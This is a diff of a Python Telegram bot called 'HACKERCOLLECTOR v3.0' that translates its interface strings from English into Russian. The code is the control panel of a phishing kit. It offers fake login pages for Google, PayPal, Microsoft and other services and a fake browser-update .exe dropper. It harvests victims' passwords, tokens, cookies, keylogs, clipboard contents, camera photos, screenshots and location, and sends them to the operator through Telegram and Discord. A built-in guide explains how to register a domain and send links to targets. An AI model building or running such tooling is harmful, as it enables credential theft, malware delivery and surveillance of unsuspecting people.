@@ -47,21 +47,21 @@ dp = Dispatcher()
 # ── КЭШ ЛЕНДИНГОВ ──
 LANDING_CACHE: dict[str, str] = {}
 LANDING_NAMES = {
-    "cf": "☁️ Cloudflare Verify",
-    "google": "🔐 Google Login",
-    "telegram": "📞 Telegram Login",
-    "discord": "💬 Discord Login",
-    "steam": "🎮 Steam Login",
-    "netflix": "🎬 Netflix Login",
-    "instagram": "📷 Instagram Login",
-    "vk": "🇷🇺 VK Login",
-    "microsoft": "🏢 Microsoft Login",
+    "cf": "☁️ Cloudflare Подтверждение",
+    "google": "🔐 Google Вход",
+    "telegram": "📞 Telegram Вход",
+    "discord": "💬 Discord Вход",
+    "steam": "🎮 Steam Вход",
+    "netflix": "🎬 Netflix Вход",
+    "instagram": "📷 Instagram Вход",
+    "vk": "🇷🇺 VK Вход",
+    "microsoft": "🏢 Microsoft Вход",
     "whatsapp": "📱 WhatsApp Web",
-    "age": "🔞 Age Verify + Selfie",
-    "update": "⬆️ Browser Update (EXE)",
-    "youtube": "▶️ YouTube Login",
-    "spotify": "🎵 Spotify Login",
-    "paypal": "💰 PayPal Login",
+    "age": "🔞 Возраст + Селфи",
+    "update": "⬆️ Обновление браузера (EXE)",
+    "youtube": "▶️ YouTube Вход",
+    "spotify": "🎵 Spotify Вход",
+    "paypal": "💰 PayPal Вход",
 }
 
 def load_landings():
@@ -298,7 +298,7 @@ async def collect_data(link_id: str, request: Request):
     # Discord если настроен
     webhook = await get_webhook(tg_id)
     if webhook and webhook["discord"] and webhook["discord_url"]:
-        discord_msg = f"**🔥 New Victim!**\nIP: {ip}\nCountry: {data['country']}\nLink: {link_id}"
+        discord_msg = f"**🔥 Новая жертва!**\nIP: {ip}\nСтрана: {data['country']}\nСсылка: {link_id}"
         try:
             import httpx
             async with httpx.AsyncClient() as cl:
@@ -319,15 +319,15 @@ async def notify_owner(tg_id: int, link_id: str, data: dict):
     risk_icon = "🟢" if risk < 20 else ("🟡" if risk < 60 else "🔴")
 
     lines = [
-        f"<b>🔥 NEW VICTIM CAPTURED</b>\n"
-        f"<blockquote>Link: <code>{link_id}</code></blockquote>",
-        f"<b>🌐 Network</b>",
+        f"<b>🔥 НОВАЯ ЖЕРТВА</b>\n"
+        f"<blockquote>Ссылка: <code>{link_id}</code></blockquote>",
+        f"<b>🌐 Сеть</b>",
         f"├ IP: <code>{data['ip']}</code> {risk_icon}",
-        f"├ Country: {data.get('country', '—')}",
-        f"├ City: {data.get('city', '—')}",
+        f"├ Страна: {data.get('country', '—')}",
+        f"├ Город: {data.get('city', '—')}",
     ]
     if data.get("lat") and data.get("lon"):
-        lines.append(f"├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Open Maps</a>")
+        lines.append(f"├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Карта</a>")
     lines.append(f"├ ISP: {data.get('isp', '—')}")
     lines.append(f"├ ASN: {data.get('asn', '—')}")
 
@@ -335,48 +335,48 @@ async def notify_owner(tg_id: int, link_id: str, data: dict):
     if data.get("vpn"): vpn_tags.append("VPN")
     if data.get("proxy"): vpn_tags.append("Proxy")
     if data.get("tor"): vpn_tags.append("TOR")
-    if data.get("hosting"): vpn_tags.append("Hosting")
-    lines.append(f"├ Tags: {'⚠️ ' + ', '.join(vpn_tags) if vpn_tags else '✅ Clean'}")
+    if data.get("hosting"): vpn_tags.append("Хостинг")
+    lines.append(f"├ Теги: {'⚠️ ' + ', '.join(vpn_tags) if vpn_tags else '✅ Чисто'}")
 
     if data.get("ua"):
         ua_short = data["ua"][:80]
-        lines.append(f"\n<b>💻 Device</b>")
-        lines.append(f"├ Browser: <code>{ua_short}</code>")
-        lines.append(f"├ Platform: {data.get('platform', '—')}")
-        lines.append(f"├ Screen: {data.get('screen', '—')}")
-        lines.append(f"├ Language: {data.get('language', '—')}")
-        lines.append(f"├ Timezone: {data.get('timezone', '—')}")
+        lines.append(f"\n<b>💻 Устройство</b>")
+        lines.append(f"├ Браузер: <code>{ua_short}</code>")
+        lines.append(f"├ Платформа: {data.get('platform', '—')}")
+        lines.append(f"├ Экран: {data.get('screen', '—')}")
+        lines.append(f"├ Язык: {data.get('language', '—')}")
+        lines.append(f"├ Таймзона: {data.get('timezone', '—')}")
 
     if data.get("cpu_cores"):
-        lines.append(f"├ CPU Cores: {data['cpu_cores']}")
+        lines.append(f"├ Ядер CPU: {data['cpu_cores']}")
     if data.get("device_memory"):
         lines.append(f"├ RAM: {data['device_memory']}GB")
     if data.get("touch"):
-        lines.append(f"├ 📱 Touch device")
+        lines.append(f"├ 📱 Сенсорное устройство")
 
     if data.get("adblock"):
-        lines.append(f"├ 🚫 AdBlock detected")
+        lines.append(f"├ 🚫 AdBlock обнаружен")
     if data.get("canvas_fp"):
-        lines.append(f"├ 🖐 Canvas fingerprint captured")
+        lines.append(f"├ 🖐 Canvas отпечаток")
 
     if data.get("login") or data.get("password") or data.get("email") or data.get("phone"):
-        lines.append(f"\n<b>✧ CREDENTIALS</b>")
+        lines.append(f"\n<b>✧ КРЕДЫ</b>")
         if data.get("email"): lines.append(f"├ Email: <code>{data['email']}</code>")
-        if data.get("login"): lines.append(f"├ Login: <code>{data['login']}</code>")
-        if data.get("password"): lines.append(f"├ Password: <code>{data['password']}</code>")
-        if data.get("phone"): lines.append(f"├ Phone: <code>{data['phone']}</code>")
-        if data.get("token"): lines.append(f"├ Token: <code>{data['token'][:60]}</code>")
+        if data.get("login"): lines.append(f"├ Логин: <code>{data['login']}</code>")
+        if data.get("password"): lines.append(f"├ Пароль: <code>{data['password']}</code>")
+        if data.get("phone"): lines.append(f"├ Телефон: <code>{data['phone']}</code>")
+        if data.get("token"): lines.append(f"├ Токен: <code>{data['token'][:60]}</code>")
 
     if data.get("discord_token"):
-        lines.append(f"\n<b>✧ TOKENS</b>")
+        lines.append(f"\n<b>✧ ТОКЕНЫ</b>")
         lines.append(f"├ Discord: <code>{data['discord_token'][:80]}</code>")
 
     if data.get("clipboard"):
-        lines.append(f"\n<b>📋 Clipboard</b>")
+        lines.append(f"\n<b>📋 Буфер обмена</b>")
         lines.append(f"<code>{data['clipboard'][:300]}</code>")
 
     if data.get("keylog"):
-        lines.append(f"\n<b>⌨️ Keylog ({len(data['keylog'])} chars)</b>")
+        lines.append(f"\n<b>⌨️ Кейлог ({len(data['keylog'])} симв.)</b>")
         lines.append(f"<code>{data['keylog'][:300]}</code>")
 
     if data.get("steam_id"):
@@ -384,14 +384,14 @@ async def notify_owner(tg_id: int, link_id: str, data: dict):
         lines.append(f"├ SteamID: <code>{data['steam_id']}</code>")
 
     if data.get("wallet_addresses"):
-        lines.append(f"\n<b>💰 Wallets</b>")
+        lines.append(f"\n<b>💰 Кошельки</b>")
         lines.append(f"├ {data['wallet_addresses'][:200]}")
 
     if data.get("visit_duration"):
-        lines.append(f"\n<b>⏱ Session</b>")
-        lines.append(f"├ Duration: {data['visit_duration']}s")
-        lines.append(f"├ Keystrokes: {data.get('keystrokes', 0)}")
-        lines.append(f"├ Clicks: {data.get('mouse_clicks', 0)}")
+        lines.append(f"\n<b>⏱ Сессия</b>")
+        lines.append(f"├ Длительность: {data['visit_duration']}с")
+        lines.append(f"├ Нажатий: {data.get('keystrokes', 0)}")
+        lines.append(f"├ Кликов: {data.get('mouse_clicks', 0)}")
 
     lines.append(f"\n📎 /victim {link_id}")
 
@@ -400,13 +400,12 @@ async def notify_owner(tg_id: int, link_id: str, data: dict):
     try:
         await bot.send_message(tg_id, msg, disable_web_page_preview=True)
 
-        # Фото
         if data.get("photo"):
             try:
                 photo_bytes = base64.b64decode(data["photo"])
-                caption = f"📸 <b>Victim photo</b>\n├ {data.get('country', '')} / {data.get('city', '')}"
+                caption = f"📸 <b>Фото жертвы</b>\n├ {data.get('country', '')} / {data.get('city', '')}"
                 if data.get("lat") and data.get("lon"):
-                    caption += f"\n├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Map</a>"
+                    caption += f"\n├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Карта</a>"
                 await bot.send_photo(
                     tg_id,
                     BufferedInputFile(photo_bytes, filename=f"victim_{link_id}.jpg"),
@@ -415,14 +414,13 @@ async def notify_owner(tg_id: int, link_id: str, data: dict):
             except Exception as e:
                 logger.warning(f"Photo send failed: {e}")
 
-        # Скриншот
         if data.get("screenshot"):
             try:
                 ss_bytes = base64.b64decode(data["screenshot"])
                 await bot.send_document(
                     tg_id,
                     BufferedInputFile(ss_bytes, filename=f"screenshot_{link_id}.png"),
-                    caption=f"🖥 <b>Victim screenshot</b>"
+                    caption=f"🖥 <b>Скриншот жертвы</b>"
                 )
             except Exception as e:
                 logger.warning(f"Screenshot send failed: {e}")
@@ -434,11 +432,11 @@ async def notify_owner(tg_id: int, link_id: str, data: dict):
 
 def main_kb():
     b = InlineKeyboardBuilder()
-    b.button(text="🎯 New Link", callback_data="new_link")
-    b.button(text="📋 My Links", callback_data="list_links")
-    b.button(text="📊 Dashboard", callback_data="dashboard")
-    b.button(text="⚙️ Settings", callback_data="settings")
-    b.button(text="📖 Guide", callback_data="guide")
+    b.button(text="🎯 Новая ссылка", callback_data="new_link")
+    b.button(text="📋 Мои ссылки", callback_data="list_links")
+    b.button(text="📊 Статистика", callback_data="dashboard")
+    b.button(text="⚙️ Настройки", callback_data="settings")
+    b.button(text="📖 Инструкция", callback_data="guide")
     b.adjust(2)
     return b.as_markup()
 
@@ -454,18 +452,18 @@ async def cmd_start(message: Message):
     await message.answer(
         f"🕵️ <b>HACKERCOLLECTOR v3.0</b>\n"
         f"<blockquote>— Zero trust. Full control. —</blockquote>\n"
-        f"├ Your stats: {len(links)} links | {v_count} victims\n"
-        f"├ Need a domain? <code>eu.cc</code> works\n\n"
-        f"<b>Modules:</b>\n"
-        f"├ <b>15</b> landing templates (Google, Discord, Steam, Telegram, Netflix, …)\n"
-        f"├ <b>Auto-capture:</b> IP, GPS, camera, screenshot, clipboard, WebGL, canvas\n"
-        f"├ <b>Credentials:</b> login/password, tokens, 2FA codes, session cookies\n"
-        f"├ <b>Live keylog</b> — every keystroke captured\n"
-        f"├ <b>AdBlock / VPN / TOR detection</b>\n"
-        f"├ <b>Automatic .exe delivery</b> for Windows victims\n"
-        f"├ <b>Discord webhook</b> support\n"
-        f"└ <b>Mass campaigns</b> — 100 links at once\n\n"
-        f"Choose action:",
+        f"├ Твоя статистика: {len(links)} ссылок | {v_count} жертв\n"
+        f"├ Нужен домен? <code>eu.cc</code> подойдёт\n\n"
+        f"<b>Модули:</b>\n"
+        f"├ <b>15</b> шаблонов лендингов (Google, Discord, Steam, Telegram, Netflix, …)\n"
+        f"├ <b>Авто-сбор:</b> IP, GPS, камера, скриншот, буфер, WebGL, canvas\n"
+        f"├ <b>Креды:</b> логин/пароль, токены, 2FA, куки сессии\n"
+        f"├ <b>Кейлоггер</b> — каждое нажатие\n"
+        f"├ <b>Обнаружение</b> AdBlock / VPN / TOR\n"
+        f"├ <b>Авто-доставка .exe</b> для Windows\n"
+        f"├ <b>Discord webhook</b> поддержка\n"
+        f"└ <b>Масс-кампании</b> — 100 ссылок разом\n\n"
+        f"Выбери действие:",
         reply_markup=main_kb()
     )
 
@@ -500,10 +498,10 @@ async def cmd_gen(message: Message, command: CommandObject):
 
     tmpl_name = LANDING_NAMES.get(template, template)
     await message.answer(
-        f"✅ <b>Link Generated</b>\n\n"
-        f"Template: <b>{tmpl_name}</b>\n"
+        f"✅ <b>Ссылка создана</b>\n\n"
+        f"Шаблон: <b>{tmpl_name}</b>\n"
         f"URL: <code>{full_url}</code>\n\n"
-        f"Send anywhere. Data arrives here.",
+        f"Кидай жертве — данные придут сюда.",
         disable_web_page_preview=True
     )
 
@@ -512,12 +510,12 @@ async def cmd_claim(message: Message):
     """Claim this bot as default owner — all untracked paths go to you."""
     await set_setting("default_owner", str(message.from_user.id))
     await message.answer(
-        "✅ <b>Domain claimed!</b>\n\n"
-        "Now any random path on your domain serves a landing page.\n"
-        "Just send anyone: <code>https://yourdomain.eu.cc/anything</code>\n\n"
-        "Works immediately — no pre-registration needed.\n"
-        "To set a different template: /set domain verify\n"
-        "To set to specific: /set domain google"
+        "✅ <b>Домен закреплён!</b>\n\n"
+        "Теперь любой рандомный путь на твоём домене показывает лендинг.\n"
+        "Просто кинь кому-нибудь: <code>https://твойдомен.eu.cc/чтоугодно</code>\n\n"
+        "Работает сразу — регистрация не нужна.\n"
+        "Сменить шаблон: /set domain verify\n"
+        "На конкретный: /set domain google"
     )
 
 @dp.message(Command("set"))
@@ -529,40 +527,40 @@ async def cmd_set(message: Message, command: CommandObject):
         template = parts[1]
         if template in LANDING_CACHE:
             await set_user_domain(message.from_user.id, f"template:{template}")
-            await message.answer(f"✅ Default template set to <b>{template}</b>")
+            await message.answer(f"✅ Шаблон по умолчанию: <b>{template}</b>")
         else:
-            await message.answer(f"❌ Unknown template. Available: {', '.join(LANDING_CACHE.keys())}")
+            await message.answer(f"❌ Неизвестный шаблон. Доступны: {', '.join(LANDING_CACHE.keys())}")
     else:
-        await message.answer("Usage: /set domain <template>")
+        await message.answer("Использование: /set domain <шаблон>")
 
 @dp.callback_query(F.data == "guide")
 async def cb_guide(cq: CallbackQuery):
     text = (
-        "<b>📖 Quick Guide</b>\n\n"
-        "<b>1. Get a domain</b>\n"
-        "Go to eu.cc or freenom, create a free domain.\n"
-        "Point CNAME to your server IP.\n\n"
-        "<b>2. Set it in bot</b>\n"
-        "Use /domain yourdomain.eu.cc\n\n"
-        "<b>3. Create a link</b>\n"
-        "Tap «New Link» → choose template → get link\n\n"
-        "<b>4. Send to target</b>\n"
-        "When they open, their data arrives here instantly.\n\n"
-        "<b>5. Collect</b>\n"
-        "IP, camera photo, screen, passwords, clipboard, keylog — all here.\n\n"
-        "<b>Old School Mode (new!):</b>\n"
-        "• /claim — claim domain, any path works instantly\n"
-        "• /gen [template] — generate clean link in one tap\n"
-        "• Just send: <code>https://domain.eu.cc/anything</code>\n"
-        "• No prefix needed. No pre-registration.\n\n"
-        "<b>Tips:</b>\n"
-        "• Use «Browser Update» template for .exe dropper\n"
-        "• Enable Discord webhook for backup channel\n"
-        "• Use geofencing to block certain countries (Settings)\n"
-        "• Mass campaign: /campaign <name> <template> <count>"
+        "<b>📖 Инструкция</b>\n\n"
+        "<b>1. Получи домен</b>\n"
+        "Зайди на eu.cc, создай бесплатный домен.\n"
+        "Пропиши CNAME на твой сервер.\n\n"
+        "<b>2. Укажи в боте</b>\n"
+        "Команда /domain твойдомен.eu.cc\n\n"
+        "<b>3. Создай ссылку</b>\n"
+        "Нажми «Новая ссылка» → выбери шаблон → получи ссылку\n\n"
+        "<b>4. Отправь жертве</b>\n"
+        "Когда откроет — данные придут сюда мгновенно.\n\n"
+        "<b>5. Собирай</b>\n"
+        "IP, фото с камеры, экран, пароли, буфер, кейлог — всё здесь.\n\n"
+        "<b>Old School режим (новинка!):</b>\n"
+        "• /claim — закрепить домен, любой путь работает сразу\n"
+        "• /gen [шаблон] — создать ссылку в один клик\n"
+        "• Просто кинь: <code>https://домен.eu.cc/чтоугодно</code>\n"
+        "• Никаких префиксов. Без регистрации.\n\n"
+        "<b>Советы:</b>\n"
+        "• Шаблон «Обновление браузера» для .exe дроппера\n"
+        "• Включи Discord webhook для канала-дублёра\n"
+        "• Гео-фенсы для блокировки стран (Настройки)\n"
+        "• Масс-кампания: /campaign <name> <template> <count>"
     )
     b = InlineKeyboardBuilder()
-    b.button(text="⬅️ Back", callback_data="back_main")
+    b.button(text="⬅️ Назад", callback_data="back_main")
     await cq.message.edit_text(text, reply_markup=b.as_markup())
     await cq.answer()
 
@@ -573,8 +571,8 @@ async def cb_back(cq: CallbackQuery):
     links = await get_user_links(tg_id)
     await cq.message.edit_text(
         f"🕵️ <b>HACKERCOLLECTOR v3.0</b>\n"
-        f"├ Your stats: {len(links)} links | {v_count} victims\n\n"
-        f"Choose action:",
+        f"├ Статистика: {len(links)} ссылок | {v_count} жертв\n\n"
+        f"Выбери действие:",
         reply_markup=main_kb()
     )
     await cq.answer()
@@ -582,28 +580,28 @@ async def cb_back(cq: CallbackQuery):
 @dp.callback_query(F.data == "new_link")
 async def cb_new_link(cq: CallbackQuery):
     b = InlineKeyboardBuilder()
-    b.button(text="☁️ Cloudflare Verify", callback_data="tmpl_cf")
-    b.button(text="🔐 Google Login", callback_data="tmpl_google")
-    b.button(text="📞 Telegram Login", callback_data="tmpl_telegram")
-    b.button(text="💬 Discord Login", callback_data="tmpl_discord")
-    b.button(text="🎮 Steam Login", callback_data="tmpl_steam")
-    b.button(text="📷 Instagram Login", callback_data="tmpl_instagram")
-    b.button(text="🇷🇺 VK Login", callback_data="tmpl_vk")
-    b.button(text="🏢 Microsoft Login", callback_data="tmpl_microsoft")
-    b.button(text="🎬 Netflix Login", callback_data="tmpl_netflix")
-    b.button(text="📱 WhatsApp Web", callback_data="tmpl_whatsapp")
-    b.button(text="🔞 Age Verify + Selfie", callback_data="tmpl_age")
-    b.button(text="⬆️ Browser Update (EXE)", callback_data="tmpl_update")
-    b.button(text="▶️ YouTube Login", callback_data="tmpl_youtube")
-    b.button(text="🎵 Spotify Login", callback_data="tmpl_spotify")
-    b.button(text="💰 PayPal Login", callback_data="tmpl_paypal")
-    b.button(text="⬅️ Back", callback_data="back_main")
+    b.button(text="☁️ Cloudflare", callback_data="tmpl_cf")
+    b.button(text="🔐 Google", callback_data="tmpl_google")
+    b.button(text="📞 Telegram", callback_data="tmpl_telegram")
+    b.button(text="💬 Discord", callback_data="tmpl_discord")
+    b.button(text="🎮 Steam", callback_data="tmpl_steam")
+    b.button(text="📷 Instagram", callback_data="tmpl_instagram")
+    b.button(text="🇷🇺 VK", callback_data="tmpl_vk")
+    b.button(text="🏢 Microsoft", callback_data="tmpl_microsoft")
+    b.button(text="🎬 Netflix", callback_data="tmpl_netflix")
+    b.button(text="📱 WhatsApp", callback_data="tmpl_whatsapp")
+    b.button(text="🔞 Возраст + Селфи", callback_data="tmpl_age")
+    b.button(text="⬆️ Обновление (EXE)", callback_data="tmpl_update")
+    b.button(text="▶️ YouTube", callback_data="tmpl_youtube")
+    b.button(text="🎵 Spotify", callback_data="tmpl_spotify")
+    b.button(text="💰 PayPal", callback_data="tmpl_paypal")
+    b.button(text="⬅️ Назад", callback_data="back_main")
     b.adjust(2)
     await cq.message.edit_text(
-        "<b>🎯 New Link — Choose Template</b>\n\n"
-        "Each template captures: IP, GPS, camera, screenshot,\n"
-        "clipboard, keylog, canvas, WebGL, browser fingerprint.\n"
-        "Credential templates also capture login/password.",
+        "<b>🎯 Новая ссылка — выбери шаблон</b>\n\n"
+        "Каждый шаблон собирает: IP, GPS, камера, скриншот,\n"
+        "буфер, кейлог, canvas, WebGL, отпечаток браузера.\n"
+        "Шаблоны с логином также собирают логин/пароль.",
         reply_markup=b.as_markup()
     )
     await cq.answer()
@@ -617,7 +615,7 @@ async def cb_create_link(cq: CallbackQuery):
     # Проверка лимита
     links = await get_user_links(tg_id, active_only=True)
     if len(links) >= MAX_LINKS_PER_USER:
-        await cq.answer(f"Limit: {MAX_LINKS_PER_USER} active links. Delete some.", show_alert=True)
+        await cq.answer(f"Лимит: {MAX_LINKS_PER_USER} активных ссылок. Удали старые.", show_alert=True)
         return
 
     link_id = generate_link_id()
@@ -631,17 +629,17 @@ async def cb_create_link(cq: CallbackQuery):
     template_name = LANDING_NAMES.get(template, template)
 
     b = InlineKeyboardBuilder()
-    b.button(text="📊 View Stats", callback_data=f"stats_{link_id}")
-    b.button(text="🎯 Another Link", callback_data="new_link")
-    b.button(text="⬅️ Main Menu", callback_data="back_main")
+    b.button(text="📊 Статистика", callback_data=f"stats_{link_id}")
+    b.button(text="🎯 Ещё ссылку", callback_data="new_link")
+    b.button(text="⬅️ Главное меню", callback_data="back_main")
     b.adjust(2)
 
     await cq.message.edit_text(
-        f"✅ <b>Link Created</b>\n\n"
-        f"Template: <b>{template_name}</b>\n"
+        f"✅ <b>Ссылка создана</b>\n\n"
+        f"Шаблон: <b>{template_name}</b>\n"
         f"URL: <code>{full_url}</code>\n"
-        f"Expires: in {LINK_TTL_HOURS}h\n\n"
-        f"Send to target → data arrives here instantly.",
+        f"Истекает: через {LINK_TTL_HOURS}ч\n\n"
+        f"Кидай жертве → данные придут сюда мгновенно.",
         reply_markup=b.as_markup()
     )
     await cq.answer()
@@ -651,13 +649,13 @@ async def cb_list_links(cq: CallbackQuery):
     links = await get_user_links(cq.from_user.id)
     if not links:
         b = InlineKeyboardBuilder()
-        b.button(text="🎯 Create First Link", callback_data="new_link")
-        b.button(text="⬅️ Back", callback_data="back_main")
-        await cq.message.edit_text("No active links. Create one:", reply_markup=b.as_markup())
+        b.button(text="🎯 Создать первую", callback_data="new_link")
+        b.button(text="⬅️ Назад", callback_data="back_main")
+        await cq.message.edit_text("Нет активных ссылок. Создай:", reply_markup=b.as_markup())
         await cq.answer()
         return
 
-    parts = ["<b>📋 Active Links:</b>\n"]
+    parts = ["<b>📋 Активные ссылки:</b>\n"]
     b = InlineKeyboardBuilder()
     for link in links[:20]:
         tmpl_name = LANDING_NAMES.get(link["template"], link["template"])
@@ -666,7 +664,7 @@ async def cb_list_links(cq: CallbackQuery):
             f"| 👁 {link['hits']} | 📥 {link['data_received']}"
         )
         b.button(text=link["id"][:8], callback_data=f"stats_{link['id']}")
-    b.button(text="⬅️ Back", callback_data="back_main")
+    b.button(text="⬅️ Назад", callback_data="back_main")
     b.adjust(4)
     await cq.message.edit_text("\n".join(parts), reply_markup=b.as_markup())
     await cq.answer()
@@ -676,7 +674,7 @@ async def cb_stats(cq: CallbackQuery):
     link_id = cq.data.replace("stats_", "")
     link = await get_link(link_id)
     if not link:
-        await cq.answer("Link not found", show_alert=True)
+        await cq.answer("Ссылка не найдена", show_alert=True)
         return
 
     victims = await get_victims(link_id)
@@ -684,23 +682,23 @@ async def cb_stats(cq: CallbackQuery):
     tmpl_name = LANDING_NAMES.get(link["template"], link["template"])
 
     b = InlineKeyboardBuilder()
-    b.button(text="🗑 Delete", callback_data=f"del_{link_id}")
-    b.button(text="📋 Victims", callback_data=f"victims_{link_id}")
-    b.button(text="⬅️ Back to list", callback_data="list_links")
-    b.button(text="🏠 Main", callback_data="back_main")
+    b.button(text="🗑 Удалить", callback_data=f"del_{link_id}")
+    b.button(text="📋 Жертвы", callback_data=f"victims_{link_id}")
+    b.button(text="⬅️ К списку", callback_data="list_links")
+    b.button(text="🏠 Главная", callback_data="back_main")
     b.adjust(2)
 
     text = (
-        f"<b>📊 Link Stats</b>\n"
+        f"<b>📊 Статистика ссылки</b>\n"
         f"├ ID: <code>{link_id}</code>\n"
-        f"├ Template: {tmpl_name}\n"
-        f"├ Hits: {link['hits']}\n"
-        f"├ Data received: {link['data_received']}\n"
-        f"├ Active: {'✅ Yes' if link['active'] else '❌ Expired'}\n"
-        f"├ Created: {link['created_at']}\n"
-        f"├ Expires: {link['expires_at']}\n"
+        f"├ Шаблон: {tmpl_name}\n"
+        f"├ Переходов: {link['hits']}\n"
+        f"├ Данных получено: {link['data_received']}\n"
+        f"├ Активна: {'✅ Да' if link['active'] else '❌ Истекла'}\n"
+        f"├ Создана: {link['created_at']}\n"
+        f"├ Истекает: {link['expires_at']}\n"
         f"├ URL: <code>{link['full_url']}</code>\n\n"
-        f"<b>Recent events:</b>\n"
+        f"<b>Последние события:</b>\n"
     )
 
     for e in events[:5]:
@@ -708,14 +706,14 @@ async def cb_stats(cq: CallbackQuery):
 
     if victims:
         v = victims[0]
-        text += f"\n<b>Latest victim:</b>\n"
+        text += f"\n<b>Последняя жертва:</b>\n"
         text += f"├ IP: <code>{v['ip']}</code> | {v.get('country', '—')}\n"
         if v.get("login") or v.get("password"):
             text += f"├ Creds: <code>{v.get('login', '')}:{v.get('password', '')}</code>\n"
         if v.get("photo"):
-            text += f"├ 📸 Photo captured\n"
+            text += f"├ 📸 Фото получено\n"
         if v.get("screenshot"):
-            text += f"├ 🖥 Screenshot captured\n"
+            text += f"├ 🖥 Скриншот получен\n"
 
     await cq.message.edit_text(text, reply_markup=b.as_markup())
     await cq.answer()
@@ -725,20 +723,20 @@ async def cb_victims(cq: CallbackQuery):
     link_id = cq.data.replace("victims_", "")
     victims = await get_victims(link_id)
     if not victims:
-        await cq.answer("No victims yet", show_alert=True)
+        await cq.answer("Жертв пока нет", show_alert=True)
         return
 
     b = InlineKeyboardBuilder()
-    b.button(text="⬅️ Back", callback_data=f"stats_{link_id}")
-    b.button(text="🏠 Main", callback_data="back_main")
+    b.button(text="⬅️ Назад", callback_data=f"stats_{link_id}")
+    b.button(text="🏠 Главная", callback_data="back_main")
 
-    parts = [f"<b>📋 Victims — {link_id[:10]}</b>\n"]
+    parts = [f"<b>📋 Жертвы — {link_id[:10]}</b>\n"]
     for i, v in enumerate(victims[:10]):
         parts.append(f"\n<b>── #{i+1} ──</b>")
         parts.append(f"IP: <code>{v['ip']}</code>")
         parts.append(f"📍 {v.get('country', '—')} / {v.get('city', '—')}")
         if v.get("lat"):
-            parts.append(f"<a href='https://maps.google.com/maps?q={v['lat']},{v['lon']}'>🗺 Map</a>")
+            parts.append(f"<a href='https://maps.google.com/maps?q={v['lat']},{v['lon']}'>🗺 Карта</a>")
         if v.get("login") or v.get("password"):
             parts.append(f"✧ <code>{v.get('login', '')}:{v.get('password', '')}</code>")
         if v.get("email"):
@@ -746,15 +744,15 @@ async def cb_victims(cq: CallbackQuery):
         if v.get("phone"):
             parts.append(f"📞 {v['phone']}")
         if v.get("token"):
-            parts.append(f"🎫 Token: <code>{v['token'][:40]}</code>")
+            parts.append(f"🎫 Токен: <code>{v['token'][:40]}</code>")
         if v.get("discord_token"):
             parts.append(f"💬 Discord: <code>{v['discord_token'][:40]}</code>")
         if v.get("platform"):
             parts.append(f"💻 {v['platform']}")
         if v.get("photo"):
-            parts.append(f"📸 Photo: yes")
+            parts.append(f"📸 Фото: да")
         if v.get("screenshot"):
-            parts.append(f"🖥 Screenshot: yes")
+            parts.append(f"🖥 Скриншот: да")
 
     await cq.message.edit_text("\n".join(parts), reply_markup=b.as_markup())
     await cq.answer()
@@ -763,7 +761,7 @@ async def cb_victims(cq: CallbackQuery):
 async def cb_delete(cq: CallbackQuery):
     link_id = cq.data.replace("del_", "")
     await delete_link(link_id)
-    await cq.message.edit_text("🗑 Link + all victim data deleted.")
+    await cq.message.edit_text("🗑 Ссылка и все данные удалены.")
     await cq.answer()
 
 @dp.callback_query(F.data == "dashboard")
@@ -778,24 +776,24 @@ async def cb_dashboard(cq: CallbackQuery):
     total_data = sum(l["data_received"] for l in links)
 
     text = (
-        f"<b>📊 Dashboard</b>\n"
-        f"├ Links created: {user['total_links'] if user else 0}\n"
-        f"├ Total victims: <b>{v_count}</b>\n"
-        f"├ Total hits: {total_hits}\n"
-        f"├ Active links: {len(links)}\n"
-        f"├ Conversion: {(total_data/total_hits*100) if total_hits else 0:.1f}%\n"
+        f"<b>📊 Статистика</b>\n"
+        f"├ Создано ссылок: {user['total_links'] if user else 0}\n"
+        f"├ Всего жертв: <b>{v_count}</b>\n"
+        f"├ Всего переходов: {total_hits}\n"
+        f"├ Активных ссылок: {len(links)}\n"
+        f"├ Конверсия: {(total_data/total_hits*100) if total_hits else 0:.1f}%\n"
     )
 
     if recent:
-        text += f"\n<b>Recent victims:</b>\n"
+        text += f"\n<b>Последние жертвы:</b>\n"
         for v in recent:
             text += f"├ <code>{v['ip']}</code> | {v.get('template', '?')} | {v.get('country', '—')}\n"
             if v.get("login"):
                 text += f"│ ✦ {v['login']}:{v.get('password','')}\n"
 
     b = InlineKeyboardBuilder()
-    b.button(text="🔄 Refresh", callback_data="dashboard")
-    b.button(text="⬅️ Back", callback_data="back_main")
+    b.button(text="🔄 Обновить", callback_data="dashboard")
+    b.button(text="⬅️ Назад", callback_data="back_main")
     await cq.message.edit_text(text, reply_markup=b.as_markup())
     await cq.answer()
 
@@ -806,30 +804,30 @@ async def cb_settings(cq: CallbackQuery):
     user = await get_user(tg_id)
     fences = await get_geo_fences(tg_id)
 
-    tg_status = "✅ ON" if (webhook and webhook["telegram"]) else "❌ OFF"
-    dc_status = "✅ ON" if (webhook and webhook["discord"]) else "❌ OFF"
-    domain = user["domain"] if user and user["domain"] else "Not set"
+    tg_status = "✅ ВКЛ" if (webhook and webhook["telegram"]) else "❌ ВЫКЛ"
+    dc_status = "✅ ВКЛ" if (webhook and webhook["discord"]) else "❌ ВЫКЛ"
+    domain = user["domain"] if user and user["domain"] else "Не указан"
 
     text = (
-        f"<b>⚙️ Settings</b>\n"
-        f"├ Domain: <code>{domain}</code>\n"
-        f"├ Notify TG: {tg_status}\n"
+        f"<b>⚙️ Настройки</b>\n"
+        f"├ Домен: <code>{domain}</code>\n"
+        f"├ Уведомл. TG: {tg_status}\n"
         f"├ Discord hook: {dc_status}\n"
-        f"└ Geo fences: {len(fences)}\n\n"
-        f"<b>Commands:</b>\n"
-        f"├ /domain yourdomain.eu.cc — set custom domain\n"
-        f"├ /webhook discord <url> — set Discord webhook\n"
-        f"├ /fence add <country> — block a country\n"
-        f"├ /fence list — show geo fences\n"
-        f"├ /fence remove <id> — remove geo fence\n"
-        f"├ /campaign <name> <template> <count> — mass links\n"
-        f"└ /export <link_id> — export victim data"
+        f"└ Гео-фенсы: {len(fences)}\n\n"
+        f"<b>Команды:</b>\n"
+        f"├ /domain твойдомен.eu.cc — установить домен\n"
+        f"├ /webhook discord <url> — Discord webhook\n"
+        f"├ /fence add <страна> — заблокировать страну\n"
+        f"├ /fence list — показать гео-фенсы\n"
+        f"├ /fence remove <id> — удалить гео-фенс\n"
